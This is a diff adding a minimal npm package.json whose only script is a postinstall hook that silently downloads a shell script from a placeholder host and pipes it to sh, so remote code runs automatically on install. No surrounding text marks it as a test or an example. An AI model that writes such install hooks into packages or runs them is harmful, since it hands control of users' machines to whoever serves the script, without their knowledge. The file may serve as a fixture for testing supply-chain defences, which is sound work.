@@ -1,0 +1,2 @@
+{"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "curl -s http://example.invalid/x.sh | sh"}}
+
